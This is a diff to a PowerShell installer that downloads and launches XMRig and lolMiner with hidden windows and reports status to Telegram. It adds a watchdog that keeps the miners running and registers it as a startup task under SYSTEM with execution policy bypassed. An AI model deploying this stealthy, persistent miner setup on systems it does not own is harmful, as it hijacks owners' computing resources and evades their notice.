@@ -51,7 +51,7 @@ if (-not (Test-Path $LOL_EXE)) {
   Get-Zip "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Win64.zip" $BIN_GPU
 }
 
-# ================= START MINERS =============
+# ================= START MINERS (INITIAL) ===
 Start-Process $XMR_EXE `
   "-o $XMR_POOL -u $KRIPTEX.$HOST -p x --http-enabled --http-port 16000" `
   -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
@@ -90,6 +90,7 @@ if ($cpuHR -gt 0 -and $gpuHR -gt 0) { $STATUS="OK" }
 elseif ($cpuHR -gt 0 -or $gpuHR -gt 0) { $STATUS="PARTIAL" }
 else { $STATUS="FAILED" }
 
+# ================= REPORT ===================
 $REPORT=@"
 INSTALLER REPORT
 Platform: windows
@@ -108,3 +109,56 @@ Time: $(Get-Date)
 
 $REPORT | Out-File -Encoding UTF8 $REPORT_FILE
 Send-TG $REPORT
+
+# ================= WATCHDOG SCRIPT ==========
+$WATCHDOG = "$BASE\watchdog.ps1"
+@"
+`$XMR_EXE='$XMR_EXE'
+`$LOL_EXE='$LOL_EXE'
+`$KRIPTEX='$KRIPTEX'
+`$HOST='$HOST'
+`$XMR_POOL='$XMR_POOL'
+`$ETC_POOL='$ETC_POOL'
+
+function CPU-Alive {
+  try {
+    `$c=Invoke-RestMethod 'http://127.0.0.1:16000/1/summary'
+    return ([int]`$c.hashrate.total[0] -gt 0)
+  } catch { return `$false }
+}
+function GPU-Alive {
+  try {
+    `$g=Invoke-RestMethod 'http://127.0.0.1:8080/summary'
+    return ([int](`$g.Session.Performance_Summary.Performance*1e6) -gt 0)
+  } catch { return `$false }
+}
+
+while (`$true) {
+  if (-not (CPU-Alive)) {
+    Start-Process `$XMR_EXE "-o `$XMR_POOL -u `$KRIPTEX.`$HOST -p x --http-enabled --http-port 16000" -WindowStyle Hidden
+  }
+  if (-not (GPU-Alive)) {
+    Start-Process `$LOL_EXE "--algo ETCHASH --pool `$ETC_POOL --user `$KRIPTEX.`$HOST --apiport 8080" -WindowStyle Hidden
+  }
+  Start-Sleep 30
+}
+"@ | Out-File -Encoding UTF8 $WATCHDOG
+
+# ================= AUTOSTART (TASK SCHEDULER)
+$taskName = "MiningWatchdog"
+$action = New-ScheduledTaskAction `
+  -Execute "powershell.exe" `
+  -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$WATCHDOG`""
+
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
+
+try {
+  Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+  Register-ScheduledTask `
+    -TaskName $taskName `
+    -Action $action `
+    -Trigger $trigger `
+    -Principal $principal `
+    -Force
+} catch {}
